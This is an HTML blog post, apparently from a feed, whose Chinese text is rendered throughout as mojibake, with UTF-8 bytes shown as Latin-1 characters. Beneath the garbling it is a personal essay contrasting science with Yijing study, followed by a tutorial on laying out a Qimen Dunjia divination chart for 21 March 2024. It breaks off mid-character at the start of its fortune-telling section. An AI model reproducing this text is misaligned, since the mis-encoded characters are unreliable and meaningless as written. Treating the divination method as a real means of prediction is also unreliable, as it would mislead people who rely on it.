        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æˆ‘å§‹ç»ˆè®¤ä¸ºæ¯ä¸ªäººæ‰€çœ‹åˆ°çš„ä¸–ç•Œå’Œå¿ƒç›®ä¸­å¯¹ä¸–ç•Œçš„ç†è§£éƒ½æ˜¯ä¸å¾ˆä¸€æ ·çš„ã€‚è‡³äºå¯¹é”™é‚£æ˜¾ç„¶æ˜¯æ²¡æœ‰çš„ï¼Œè¯•å›¾å®£æ‰¬ä¸€ç§â€œæ­£ç¡®çš„â€æ€æƒ³å­¦è¯´æœ¬èº«å°±ä¸èƒ½è¢«ç§°ä¹‹äºâ€æ­£ç¡®â€œã€‚ä¸€ä¸ªå¥½çš„æ¼”è®²åœ¨æˆ‘çœ‹æ¥å°±æ˜¯è®©è¯»è€…å¯¹è¿™ä¸ªä¸–ç•Œæœ‰äº†æ›´å¤šçš„äº†è§£æˆ–è€…å¼€å§‹å¯¹æŸä»¶äº‹æƒ…æˆ–è€…æŸç±»äº‹æƒ…æœ‰äº†æ€è€ƒï¼Œè€Œä¸åªæ˜¯çœ‹ç€æ—¶é—´æµé€ç„¶åéšæ³¢é€æµã€‚</p><p>ä¸­å›½å¤ä»£å“²å­¦ï¼Œå„’é“ä½›ï¼Œè¿˜æœ‰èª‰ä¸ºç¾¤ç»ä¹‹é¦–çš„ã€Šæ˜“ç»ã€‹åœ¨ç°ä»£ç§‘å­¦ç‹¬è£çš„ç‰ˆæœ¬ä¸‹ä¼¼ä¹æœ‰ç‚¹åœ°ä½å±æœºäº†ã€‚å¯ä»”ç»†æƒ³æƒ³ï¼Œç§‘å­¦ä¹‹å¤–ï¼Œæ˜¾ç„¶è¿˜å­˜åœ¨ä¸€ç‰‡å¹¿é˜”çš„å¤©åœ°ã€‚è¿˜è®°å¾—åˆšè¸å…¥ç‰©ç†ä¸–ç•Œå¤§é—¨çš„æ—¶å€™ï¼Œç‹¬æ–­çš„è®¤ä¸ºï¼Œç‰©ç†(å¹¿ä¹‰)æ˜¯äººç±»çœ‹æ¸…ä¸–ç•Œæœ¬è´¨çš„é‡è¦æ¸ é“ï¼Œè¯•å›¾çª¥æ¢å®‡å®™çš„åº•å±‚é€»è¾‘ï¼Œçª¥æ¢è‡ªç„¶ã€ç”Ÿå‘½çš„æœ¬è´¨ï¼Œä¹Ÿå°±ç†è§£äº†ä¸‡ç‰©ã€‚å¯æ˜¯å½“æˆ‘çœ‹è§åˆ˜æ…ˆæ¬£ã€Šæœé—»é“ã€‹é‡Œé‚£å¥é¡¶çº§è´¨é—®ï¼šå®‡å®™çš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Ÿå¤§è„‘ä¸€ç‰‡ç©ºç™½ã€‚å®‡å®™æœ‰ç›®çš„å—ï¼Ÿ</p><p>ç§‘å­¦ï¼ŒæŸç§ç¨‹åº¦ä¸Šæ˜¯ä¸€é—¨è§£é‡Šæ€§å­¦ç§‘ï¼Œå®ƒè¯•å›¾è§‚å¯Ÿä¸–ç•Œï¼Œæ¨æ¼”å‡ºå…¶ä¸­çš„ä¸€èˆ¬æ€§ç»“è®ºï¼Œæˆ–è€…è¯´ä¸€ä¸ªè¿‘ä¼¼è§£ï¼Œç”¨äºè§£é‡Šè¿™ä¸ªçœ‹èµ·æ¥æœ‰ç‚¹å¤æ‚çš„ä¸–ç•Œã€‚æ‹¿æˆ‘ä»¬ç†ŸçŸ¥çš„åŠ›å­¦ä¸¾ä¾‹ï¼Œç‰©ç†ç•ŒæŠŠç›®å‰æ‰€æœ‰çš„ç‰©ä½“é—´ç›¸äº’ä½œç”¨å½’ä¸ºå››å¤§åŠ›(ç†è®ºåŠ›å­¦ã€çƒ­åŠ›å­¦ä¸ç»Ÿè®¡ç‰©ç†å­¦ã€ç”µåŠ¨åŠ›å­¦ã€é‡å­åŠ›å­¦)ï¼Œè¿™ä¹Ÿåªæ˜¯ç›®å‰ç»™å‡ºçš„ç»“è®ºï¼Œåœ¨é‡å­åŠ›å­¦æ²¡å‡ºæ¥ä¹‹å‰åªæœ‰ä¸‰å¤§åŠ›ï¼Œåæ¥æœ‰äº†å››å¤§åŠ›ï¼Œç”šè‡³ç›®å‰ä¹Ÿæ²¡èƒ½ç»Ÿä¸€ã€‚æˆ‘å¾ˆè®¤å¯çš„ä¸€å¥è¯æ˜¯ï¼šç§‘å­¦æœ¬è´¨ä¸Šæ˜¯è¯ä¼ªã€‚æˆ‘æå‡ºä¸€ä¸ªç†è®ºï¼Œå¤§å®¶éƒ½æ²¡åŠæ³•è¯æ˜å®ƒæ˜¯é”™çš„ï¼Œé‚£æˆ‘ä»¬å°±è®¤ä¸ºå®ƒæ˜¯å¯¹çš„ã€‚æˆ‘ä»¬è¯•å›¾ç”¨å…¬å¼ï¼Œå®šç†æ¥<strong>è§£é‡Š</strong>è¿™ä¸ªä¸–ç•Œã€‚è‡³äºè¿™ä¸ªè§£é‡Šæ˜¯å¦æ­£ç¡®ï¼Œå®‡å®™æ˜¯å¦çœŸçš„å­˜åœ¨ä¸€ä¸ªå¤§ç»Ÿä¸€ç†è®ºï¼Œæ˜¯å­˜ç–‘çš„ã€‚é€€ä¸€æ­¥è®²ï¼Œå®‡å®™æ˜¯å¦æ˜¯â€œç§‘å­¦çš„â€ï¼Œä¹Ÿéƒ½æ˜¯å­˜ç–‘çš„ã€‚åƒäºŒç»´ä¸–ç•Œçš„äººæ°¸è¿œä¸èƒ½ç†è§£ç«‹ä½“è¿™ä¸ªæ¦‚å¿µä¸€æ ·ï¼Œå¤ªå¤šçš„ä¸œè¥¿æˆ‘ä»¬ä¸èƒ½ç†è§£ï¼Œä¹Ÿä¸ä¼šâ€æ­£ç¡®â€ã€‚</p><p>é‚£ä¹ˆæ˜“å­¦æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæœ‰ä¸€å¥å¾ˆç»å…¸çš„è¯ï¼šâ€œè¡Œè€Œä¸Šè€…ä¹‹è°“é“ï¼Œå½¢è€Œä¸‹è€…ä¹‹è°“å™¨â€ï¼Œä¼¼ä¹æˆ‘ä»¬è®¨è®ºçš„éƒ½æ˜¯åŸºäºâ€å™¨â€œçš„èŒƒç•´ã€‚è€Œè‡³äºâ€é“â€œï¼Œäº‹å®ä¸Šæˆ‘ä¹Ÿæš‚æ—¶æ²¡èƒ½ç†è§£è¿™ä¸ªå­—çš„çœŸå®å«ä¹‰ã€‚</p><h2 id="æ˜“å­¦ä¸ç§‘å­¦"><a href="#æ˜“å­¦ä¸ç§‘å­¦" class="headerlink" title="æ˜“å­¦ä¸ç§‘å­¦"></a>æ˜“å­¦ä¸ç§‘å­¦</h2><p>ä»¥æˆ‘æµ…è–„çš„è®¤çŸ¥ï¼Œç§‘å­¦è¯•å›¾é€šè¿‡è§£é‡Šäº‹ç‰©çš„åº•å±‚é€»è¾‘ï¼Œä»¥æ­¤æ¥è§£é‡Šè¿™ä¸ªä¸–ç•Œã€‚è€Œæ˜“å­¦ï¼Œä¸å…³å¿ƒè¿™ä¸ªä¸–ç•Œçš„åº•å±‚é€»è¾‘ï¼Œæˆ‘ä»¬åªæ˜¯çœ‹åˆ°äº†è¿™ä¸ªä¸–ç•Œï¼Œç„¶åé€šè¿‡æˆ‘ä»¬æ‰€çœ‹åˆ°çš„å·²çŸ¥çš„ä¸–ç•Œï¼Œæ¥æ¨æµ‹è¿™ä¸ªä¸–ç•Œçš„çœŸé¢ç›®ã€‚æ‹¿æ—¥å‡ºä¸¾ä¾‹ï¼Œç‰©ç†å­¦å®¶ä¼šè¯´ï¼Œåœ°çƒå›´ç€å¤ªé˜³å…¬è½¬è½¬ï¼Œåœ°çƒå†è‡ªè½¬ï¼Œè‡ªè½¬å‘¨æœŸæ˜¯ä¸€å¤©ï¼Œæ‰€ä»¥æ¯å¤©æ—©ä¸Šæˆ‘ä»¬ä¼šçœ‹åˆ°å¤ªé˜³å‡èµ·ï¼Œå‚æ™šå¤ªé˜³è½ä¸‹ã€‚è€Œæ˜“å­¦å®¶è¯´ï¼Œæˆ‘è§‚å¯Ÿäº†å‡ åå¹´ï¼Œæ¯å¤©æ—©ä¸Šå¤ªé˜³éƒ½ä¼šä»ä¸œæ–¹å‡èµ·ï¼Œæ‰€ä»¥æ˜å¤©æ—©ä¸Šï¼Œå¤ªé˜³å¤§æ¦‚ç‡ä¹Ÿä¼šä»ä¸œè¾¹å‡èµ·ï¼Œè‡³äºä¸ºä»€ä¹ˆï¼Œæˆ‘ä¸å…³å¿ƒï¼Œè¿™æ˜¯è‡ªç„¶çš„è§„å¾‹ã€‚æ˜“å­¦ã€‚æŸç§ç¨‹åº¦ä¸Šï¼Œåªå…³å¿ƒå®è·µã€å…³å¿ƒè¡Œä¸ºï¼Œè€Œä¸å…³å¿ƒäº‹ç‰©æœ¬èº«ã€‚</p><p>è¿™æ ·ä¸¤ç§æƒ³æ³•å“ªä¸ªæ˜¯å¯¹çš„å“ªä¸ªæ˜¯é”™çš„ï¼Ÿå…¶å®æ ¹æœ¬æ²¡æœ‰æ„ä¹‰ï¼Œå°±åƒå¼€å¤´è¯´ï¼Œæ¯ä¸ªäººè®¤çŸ¥ä¸–ç•Œçš„æ–¹å¼ä¸ä¸€æ ·ï¼Œçœ‹åˆ°çš„ä¸–ç•Œä¹Ÿåƒå·®ä¸‡åˆ«ï¼Œæ²¡æœ‰å“ªä¸€ä¸ªæ˜¯å”¯ä¸€æ­£ç¡®çš„ï¼Œæˆ‘ä»¬åªèƒ½è¯´ï¼šå­˜åœ¨å³åˆç†ã€‚</p><p>å›è¿‡å¤´ï¼Œæ˜“å­¦çš„ä»·å€¼ï¼Œåœ¨å­¦ä¸æœ¯ä¸¤æ–¹é¢ï¼Œæœ‰å…³æœ¯çš„æ–¹é¢ï¼Œç‹­ä¹‰çš„ç†è§£ï¼Œä¹Ÿå°±æ˜¯ç®—å¦ã€‚æœ‰å…³ç®—å¦ï¼Œæˆ‘ä»¬å¦‚ä½•ç›¸ä¿¡ç®—å¦å¾—å‡ºçš„ç»“è®ºçš„æ˜¯å¯ä¿¡çš„ï¼Ÿæˆ‘å§‘ä¸”æµ…è–„å¯¹å®ƒåšä¸€äº›è§£é‡Šã€‚</p><h3 id="å¯¹ç§°å¾‹"><a href="#å¯¹ç§°å¾‹" class="headerlink" title="å¯¹ç§°å¾‹"></a>å¯¹ç§°å¾‹</h3><p>åœ¨ç‰©ç†å­¦ä¸­å¯¹ç§°æ€§æœ‰æ—¶è¢«ç§°ä½œâ€œå†³å®šè§„å¾‹çš„è§„å¾‹â€ï¼Œå…¶æ™®éæ€§æ˜¯æ¯‹åº¸ç½®ç–‘çš„ã€‚è€Œå‘¨æœŸå¾‹æŸç§ç¨‹åº¦ä¸Šå¯ä»¥ç†è§£ä¸ºæ—¶é—´å¹³ç§»ä¸å˜æ€§ã€‚æµ…æ˜¾çš„è®²ï¼Œå¤ªé˜³ç³»è¡Œæ˜Ÿå›´ç€å¤ªé˜³å…¬è½¬ï¼Œåœ°çƒè‡ªè½¬ï¼Œå¤ªé˜³ä¸œå‡è¥¿è½ï¼Œç”Ÿç‰©ç”Ÿè€ç—…æ­»ï¼Œè¿™äº›éƒ½æ˜¯å‘¨æœŸæ€§çš„ã€‚æ—¢ç„¶æ˜¯å‘¨æœŸæ€§çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆç†çš„é€šè¿‡è¿‡å»å‘ç”Ÿçš„äº‹æƒ…ï¼Œç»“åˆæ•´ä¸ªå†å²é•¿æ²³å‘¨æœŸæ€§äº‹ä»¶çš„ä¸æ–­ä¸Šæ¼”ï¼Œæ¨æµ‹å‡ºæœªæ¥å‘ç”Ÿçš„äº‹æƒ…å§ã€‚</p><p>ä»¥å²ä¸ºé‰´ã€‚åœ¨æˆ‘çœ‹æ¥å‘¨æ˜“å¾ˆå¤§çš„ä¸€ä¸ªä¼˜åŠ¿æ˜¯å®ƒç»§æ‰¿äº†å¤ä»Šä¸Šä¸‹å‡ åƒå¹´çš„å†å²ï¼Œä¸æ–­ä¿®æ”¹ï¼Œä½¿å¾—è¿™æ ·çš„æ¨æµ‹æ¨¡å‹æ„ˆå‘ç²¾å‡†ã€‚å°±åƒè½°åŠ¨æ—¶ä»£çš„äº§ç‰© gpt ï¼Œæœ¬è´¨ä¸Šä¹Ÿè®¸åªæ˜¯ç»“åˆä¸Šä¸‹æ–‡è¯­å¢ƒæ¨æµ‹ä¸‹ä¸€ä¸ªå­—æ˜¯ä»€ä¹ˆã€‚ä¸æ–­çš„æ¨æµ‹ä¸‹ä¸€ä¸ªå­—ï¼Œç„¶åè¿æˆä¸€å¥è¯ã€è¿æˆæ®µè½ã€‚è¿™å’Œæ˜“å­¦ä¸­æœ‰å…³ç®—å¦çš„éƒ¨åˆ†æ˜¯å¾ˆç›¸ä¼¼çš„ã€‚</p><h3 id="æ˜“"><a href="#æ˜“" class="headerlink" title="æ˜“"></a>æ˜“</h3><p><strong>å˜æ˜“ã€ç®€æ˜“ã€ä¸æ˜“ã€‚</strong></p><h2 id="å¥‡é—¨éç”²"><a href="#å¥‡é—¨éç”²" class="headerlink" title="å¥‡é—¨éç”²"></a>å¥‡é—¨éç”²</h2><p>æœ‰å…³æ˜“å­¦è¡ç”Ÿå‡ºå„ç§å„æ ·çš„è±¡æ•°ç†æ¨¡å‹ï¼šç´«å¾®æ–—æ•°ã€å…­çˆ»ã€æ¢…èŠ±æ˜“æ ‘ã€å¥‡é—¨éç”²ã€‚</p><p>å…¶ä¸­å¥‡é—¨éç”²å·ç§°æ˜¯â€œä¸­å›½æ–¹å¼ä¸­å¼å çš„é›†å¤§æˆè€…â€ã€‚èå‘¨æ˜“ã€å¤©æ–‡ã€å¾‹å†ã€é˜´é˜³äº”è¡Œä¸ºä¸€ä½“ã€‚è¿‡å»å·ç§°å¸ç‹ä¹‹å­¦ï¼Œæºäºå†›äº‹ä¸Šçš„æ’å…µå¸ƒé˜µã€‚å…·ä½“è€Œè¨€ï¼Œå°±æ˜¯<strong>ä¹å®«å…«å¦é˜µ</strong>ã€‚</p><h3 id="å‰ç½®"><a href="#å‰ç½®" class="headerlink" title="å‰ç½®"></a>å‰ç½®</h3><ul><li>å…­åç”²å­ï¼š(åå¤©å¹²åäºŒåœ°æ”¯)ï¼šä»¥æ—¶é—´ä¸ºä¸»</li><li>ä¹å®«å…«å¦ï¼šä»¥ç©ºé—´ä¸ºä¸»</li></ul><p>å¥‡é—¨éç”²å°†äºŒè€…èåˆåœ¨ä¸€èµ·ï¼Œæ„æˆä¸€ä¸ªæ—¶ç©ºæ¨¡å‹ã€‚</p><ul><li>åå¤©å¹²ï¼šç”²(éç”²)ä¹™ä¸™ä¸(ä¸‰å¥‡:æ—¥æœˆæ˜Ÿ)æˆŠå·±åºšè¾›å£¬ç™¸(å…­ä»ª)</li><li>åäºŒåœ°æ”¯ï¼šå­ä¸‘å¯…å¯è¾°å·³åˆæœªç”³é…‰æˆŒäº¥</li><li>å…­åç”²å­ï¼šå…­ç”²(ç”²å­ã€ç”²æˆŒã€ç”²ç”³ã€ç”²åˆã€ç”²è¾°ã€ç”²å¯…)ã€å…­ä¹™Â·Â·Â·å…­ç™¸</li></ul><p>å…¶ä¸­â€˜éç”²â€™éšåŒ¿åœ¨å…­ä»ªä¹‹å(ç”²å­æˆŠã€ç”²æˆŒå·±ã€ç”²ç”³åºšã€ç”²åˆè¾›ã€ç”²è¾°å£¬ã€ç”²å¯…ç™¸)ï¼Œä¹Ÿå°±æ˜¯ä¹å¤©å¹²(æˆŠå·±åºšè¾›å£¬ç™¸ä¸ä¸™ä¹™[é˜³é])ï¼Œä»¥é…ä¹å®«å…«å¦é˜µã€‚</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240322005058163.png" alt="image-20240322005058163" style="zoom: 25%;" /><ul><li>ä¹å®«å…«å¦é˜µåˆ†ä¸ºé˜³éå±€å’Œé˜´éå±€ï¼Œå†³å®šä¹å¤©å¹²æ’é˜µé¡ºåºã€‚</li><li>é˜³éåˆåˆ†é˜³éä¸€å±€ã€é˜³éäºŒå±€åˆ°é˜³éä¹å±€ã€‚è§„åˆ™ä¸ºï¼šç”²å­æˆŠéåœ¨å‡ å®«ï¼Œå°±æ˜¯å‡ å±€ï¼Œ</li></ul><p>æ¯”å¦‚ï¼šé˜³éä¸‰å±€ï¼šç”²å­æˆŠåœ¨ä¸‰å®«ï¼ŒæŒ‰ç…§é¡ºæ’ï¼Œé‚£ä¹ˆäºŒç”²ç”²æˆŒå·±åœ¨å››å®«Â·Â·Â·</p><p>(å…¶ä¸­ä¹å®«é¡ºåºæºè‡ªäºæ´›ä¹¦[â€æ²³å‡ºå›¾ï¼Œæ´›å‡ºä¹¦ï¼Œåœ£äººåˆ™ä¹‹â€])</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240322005136473.png" alt="image-20240322005136473" style="zoom: 25%;" /><p>è®°ä½è¿™ä¸ªé¡ºåºå°±å¯ä»¥å¼€å§‹èµ·å±€äº†</p><h3 id="èµ·å±€"><a href="#èµ·å±€" class="headerlink" title="èµ·å±€"></a>èµ·å±€</h3><p>ä»¥é˜³éä¸‰å±€ä¸ºä¾‹ï¼š</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240322005211991.png" alt="image-20240322005211991" style="zoom:10%;" /><p>å½“ç„¶ä¹Ÿå¯ä»¥åœ¨æ‰‹ä¸Šèµ·å±€(è¿™æ ·ä¼šæ˜¾å¾—éå¸¸ä¸“ä¸šhhh)ï¼š</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240322005228540.png" alt="image-20240322005228540" style="zoom:10%;" /><p>è¿™æ˜¯ç¬¬ä¸€æ­¥åŸºæœ¬åŠŸã€‚</p><blockquote><p>é‚£æˆ‘ä»¬æ€ä¹ˆåˆ¤æ–­è¯¥ç”¨å“ªä¸€å±€å‘¢ï¼Ÿ</p></blockquote><p>å…­åå¤©å¹²è½®ä¸€å±€ï¼Œä¸€å¤©å¹²ä¸€æ—¶è¾°ä¸¤å°æ—¶(æ—¶å®¶å¥‡é—¨)ï¼Œæ€»å…±äº”å¤©ã€‚è¿™äº”å¤©ä¸­æ ¼å±€ä¸å˜ã€‚ä¹Ÿå°±æ˜¯è¯´å¥‡é—¨éç”²ä»¥äº”å¤©ä¸ºå•ä½èµ·ä¸€å±€ç§°ä¸ºä¸€å…ƒ)ã€‚è‡³äºé˜´éè¿˜æ˜¯é˜³éï¼Œè¿™å–å†³äºä¸€å¹´äºŒåå››èŠ‚æ°”ã€‚æ¯èŠ‚æ°”åäº”å¤©(ä¸‰å±€ï¼šä¸Šä¸­ä¸‹ä¸‰å…ƒ)ã€‚</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240322005308583.png" alt="image-20240322005308583" style="zoom:25%;" /><p>æ ¹æ®å†¬è‡³ä¸€é˜³ç”Ÿï¼Œå¤è‡³ä¸€é˜´ç”Ÿã€‚å³ï¼šé¡ºæ—¶é’ˆæ–¹å‘ï¼Œä»å†¬è‡³å¼€å§‹ç”¨é˜³éä¹å±€ï¼›ä»å¤è‡³å¼€å§‹ç”¨é˜´éä¹å±€ã€‚</p><p>è€Œå…¶ä¸­å…·ä½“çš„ä¸Šä¸­ä¸‹å…ƒç”¨å“ªä¸€å±€ï¼Œåˆæ˜¯ç›¸å½“è®²ç©¶çš„äº†ã€‚å„å®¶æœ‰å„å®¶è¯´æ³•ï¼Œåœ¨è¿™é‡Œä¸å†èµ˜è¿°ã€‚</p><p>å¯ä»¥ç›´æ¥æŸ¥è¡¨ï¼ˆ</p><p>æ¯”å¦‚ç°åœ¨ï¼šåˆšæ˜¥åˆ†ç¬¬äºŒå¤©ï¼Œå±äºæ˜¥åˆ†ä¸­çš„ä¸Šå…ƒï¼Œç”¨é˜³ä¸‰å±€ã€‚</p><h3 id="å¤©åœ°äººç¥"><a href="#å¤©åœ°äººç¥" class="headerlink" title="å¤©åœ°äººç¥"></a>å¤©åœ°äººç¥</h3><p>ä¿—è¯è¯´å¤©æ—¶åœ°åˆ©äººå’Œï¼Œå…‰æœ‰ä¸Šé¢å…­å°†å¸…ä¸‰å¥‡å…µ(åœ°ç›˜)ï¼Œè¿˜ä¸è¶³ä»¥å®Œå…¨å†³å®šæœªæ¥ã€‚å¥‡é—¨éç”²åœ¨åœ°ç›˜åŸºç¡€ä¸Šï¼ŒåˆåŠ ä¸Šï¼šå¤©ç›˜ã€äººç›˜ã€ç¥ç›˜ä¸‰è¦ç´ ã€‚</p><ul><li>åœ°ï¼šé˜³éä¹å±€ã€é˜´éä¹å±€<ul><li>äº”å¤©ä¸€å±€</li></ul></li><li>å¤©ï¼šå¤äººè®¤ä¸ºçš„ä¹å¤§è¡Œæ˜Ÿ<ul><li>å¤©è“¬æ˜Ÿ&#x2F;è´ªç‹¼æ˜Ÿ(ä¸€å®«)</li><li>å¤©è‹ªæ˜Ÿ&#x2F;å·¨é—¨æ˜Ÿ(äºŒå®«)</li><li>å¤©å†²æ˜Ÿ&#x2F;ç¦„å­˜æ˜Ÿ(ä¸‰å®«)</li><li>å¤©è¾…æ˜Ÿ&#x2F;æ–‡æ›²æ˜Ÿ(å››å®«)</li><li>å¤©ç¦½æ˜Ÿ&#x2F;å»‰è´æ˜Ÿ(äº”å®«)</li><li>å¤©å¿ƒæ˜Ÿ&#x2F;æ­¦æ›²æ˜Ÿ(å…­å®«)</li><li>å¤©æŸ±æ˜Ÿ&#x2F;ç ´å†›æ˜Ÿ(ä¸ƒå®«)</li><li>å¤©ä»»æ˜Ÿ&#x2F;å·¦è¾…æ˜Ÿ(å…«å®«)</li><li>å¤©è‹±æ˜Ÿ&#x2F;å³å¼¼æ˜Ÿ(ä¹å®«)<ul><li>å¤©è±¡ä¸€ç›´è¿è½¬å˜åŒ–ï¼Œéšæ—¶è¾°å¤©å¹²è½¬åŠ¨</li></ul></li></ul></li></ul><blockquote><p>éšæ—¶è¾°å¤©å¹²è½¬åŠ¨è§£é‡Šï¼š</p><ul><li>ç¬¬ä¸€æ­¥é€‰å‡ºå€¼å®ˆçš„å¤©æ˜Ÿï¼Œåœ¨å¥‡é—¨éç”²ä¸­ä¹Ÿå«ï¼šå€¼ç¬¦<ul><li>æ¯”å¦‚ç°åœ¨2024å¹´3æœˆ21æ—¥(æ˜¥åˆ†ç¬¬äºŒå¤©)23:04ã€‚æ—¶è¾°ï¼šæˆŠå­æ—¶ï¼Œå±äºç”²æˆŒæ—¬(äºŒç”²)ã€‚è€Œæ˜¥åˆ†é˜³éä¸‰å±€ï¼Œä¸€ç”²å±…ä¸‰å®«ï¼Œæ‰€ä»¥äºŒç”²å±…å››å®«ã€‚æ‰€ä»¥æ˜¯å››å®«å¯¹åº”çš„å¤©æ˜Ÿï¼š<strong>å¤©è¾…æ˜Ÿ&#x2F;æ–‡æ›²æ˜Ÿ</strong> å€¼å®ˆã€‚</li></ul></li><li>è€Œå€¼ç¬¦è½åœ¨å“ªä¸€å®«å‘¢ï¼Ÿ<ul><li>æˆŠå­æ—¶ï¼Œå¤©å¹²ä¸ºæˆŠã€‚æˆŠæ—¶å…ƒå¸…ç”²å­çš„ä»ªä»—ã€‚è€Œç”²å­åœ¨é˜³éä¸‰å±€ä¸­å±…ä¸‰å®«ï¼Œæ‰€ä»¥æ­¤æ—¶è¿™ä¸€å±€ï¼Œå€¼ç¬¦ä¹Ÿéšä¹‹è¿è½¬åˆ°ä¸‰å®«ã€‚</li></ul></li></ul></blockquote><ul><li>äººï¼šäººç›˜åˆå«é—¨ç›˜ã€‚æ€»å…±å…«é—¨ï¼Œä¸å…«å¦ã€å…«æ–¹å¯¹åº”<ul><li>ä¼‘é—¨(ä¸€å®«)ï¼Œä¸å¤©è“¬æ˜Ÿå¯¹åº”</li><li>æ­»é—¨(äºŒ&#x2F;äº”å®«)ï¼Œä¸å¤©è‹ªæ˜Ÿ&#x2F;å¤©ç¦½æ˜Ÿå¯¹åº”</li><li>ä¼¤ä»¬(ä¸‰å®«)ï¼Œä¸å¤©å†²æ˜Ÿå¯¹åº”</li><li>æœé—¨(å››å®«)ï¼Œä¸å¤©è¾…æ˜Ÿå¯¹åº”</li><li>å¼€é—¨(å…­å®«)ï¼Œä¸å¤©å¿ƒæ˜Ÿå¯¹åº”</li><li>æƒŠé—¨(ä¸ƒå®«)ï¼Œä¸å¤©æŸ±æ˜Ÿå¯¹åº”</li><li>ç”Ÿé—¨(å…«å®«)ï¼Œä¸å¤©ä»»æ˜Ÿå¯¹åº”</li><li>æ™¯é—¨(ä¹å®«)ï¼Œä¸å¤©è‹±æ˜Ÿå¯¹åº”<ul><li>é˜³éé¡ºè¡Œã€é˜´éé€†è¡Œã€‚éšæ—¶è¾°åœ°æ”¯å’Œä¹å®«æ¬¡åºè¿è½¬<ul><li>ç¡®å®šå¤©ä¸Šçš„å€¼ç¬¦åï¼Œå¯¹åº”çš„å…«é—¨ä¹‹ä¸€å°±æ˜¯å¯¹åº”é—¨åï¼Œä¹Ÿç§°å€¼ä½¿ã€‚æ¯”å¦‚ä¸Šé¢è¯´çš„é‚£å±€ï¼Œå°±æ˜¯å¤©è¾…æ˜Ÿå¯¹åº”çš„æœé—¨å½“å€¼ä½¿</li><li>éšæ—¶è¾°åœ°æ”¯å’Œä¹å®«æ¬¡åºï¼šæ¯”å¦‚ç°åœ¨æˆŠå­æ—¶ï¼Œå±äºäºŒç”²ç”²æˆŒæ—¬ï¼Œå±…å››å®«ã€‚æ•…æˆŒæ—¶(æ—¬å¤´åœ°æ”¯)å€¼ä½¿æœé—¨å±…å››å®«ï¼Œé˜³éé¡ºè¡Œï¼Œäº¥æ—¶åœ¨äº”å®«ï¼Œå­æ—¶å°±åœ¨å…­å®«ã€‚æ•…è¿™ä¸€å±€ï¼Œå€¼ä½¿æœé—¨åœ¨å…­å®«</li></ul></li></ul></li></ul></li><li>ç¥ï¼šå¤äººæ ¹æ®é˜´é˜³äº”è¡Œï¼Œåœ¨å¤©åœ°äººçš„æ„Ÿåº”ä¸­ï¼Œå‘ç°çš„å…«ç§å½±å“äººç±»ç”Ÿæ´»å‰å‡¶ç¥¸ç¦çš„ä¸¾äº‹æˆè´¥å¾—å¤±çš„ç¥ç§˜èƒ½é‡ã€‚ä¼ ç»Ÿä¸Šåˆç§°â€œç¥ç…â€<ul><li>å°å€¼ç¬¦ï¼ˆå…«ç¥ä¹æ˜Ÿä¹‹é¦–ï¼Œæ‰€åˆ°ä¹‹å¤„ï¼Œç™¾æ¶é€€æ•£ã€‚ï¼‰</li><li>è…¾è›‡</li><li>å¤ªé˜´</li><li>å…­åˆ</li><li>ç™½è™</li><li>ç„æ­¦</li><li>ä¹åœ°</li><li>ä¹å¤©<ul><li>é˜³éé¡ºæ’é˜´éé€†æ’</li><li>è¿è½¬è§„å¾‹æœ‰ä¸åŒè¯´æ³•ã€‚ä¸€ç§è®¤ä¸ºï¼šå°å€¼ç¬¦æ°¸è¿œéšå¤§å€¼ç¬¦ï¼Œä¾æ¬¡æ’ã€‚</li></ul></li></ul></li></ul><h3 id="å®æ“"><a href="#å®æ“" class="headerlink" title="å®æ“"></a>å®æ“</h3><p>ä»¥2024å¹´3æœˆ21æ—¥23:43åˆ†ä¸ºä¾‹ï¼šåŸºæœ¬æ—¶é—´ä¿¡æ¯æ˜¥åˆ†ç¬¬äºŒå¤©ï¼Œä¸Šå…ƒï¼ŒæˆŠå­æ—¶(ç”²æˆŒæ—¬(äºŒç”²))</p><ul><li>åœ°ç›˜<ul><li>é˜³éä¸‰å±€ï¼Œå…ˆèµ·å±€åˆ—å¥½åœ°ç›˜(ä¸Šé¢å·²ç»åˆ—è¿‡äº†)ã€‚</li></ul></li><li>å¤©ç›˜<ul><li>æ—¬å¤´ç”²æˆŒæ—¬ä¸ºäºŒç”²ï¼Œåœ¨é˜³éä¸‰å±€ä¸­å±…å››å®«ã€‚å››å®«å¯¹åº”å¤©è¾…æ˜Ÿã€‚è€Œæ—¶è¾°æˆŠå­æ—¶å¤©å¹²ä¸ºæˆŠï¼Œä¸ºç”²å­éšåŒ¿çš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯ä¸‰å®«ã€‚</li><li>æ•…å¤©ç›˜ï¼šå€¼ç¬¦å¤©è¾…æ˜Ÿå±…ä¸‰å®«ã€‚</li></ul></li><li>äººç›˜<ul><li>å€¼ç¬¦å¤©è¾…æ˜Ÿå¯¹åº”é—¨ç¥ä¸ºæœé—¨</li><li>æ—¬å¤´ç”²æˆŒæ—¬ï¼Œåœ°æ”¯ä¸ºæˆŒå±€å››å®«ï¼Œå³æˆŒæ—¶å€¼ä½¿æœé—¨å±€å››å®«ï¼Œå¯¹åº”åˆ°ç°åœ¨çš„å­æ—¶ï¼Œå±…å…­å®«ã€‚</li><li>æ•…å¤©ç›˜ï¼šå€¼ä½¿æœé—¨å±…å…­å®«</li></ul></li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240322005340534.png" alt="image-20240322005340534" style="zoom:25%;" /><ul><li>ä¹‹åçš„æ’é˜µï¼Œä¸åŒé—¨æ´¾å‡æœ‰ä¸åŒé¡ºåºã€‚å°±ä¸å±•å¼€ã€‚</li></ul><h3 id="ç®—å¦"><a href="#ç®—å¦" class="headerlink" title="ç®—å¦"></a>ç®—å¦</h3><p>æ 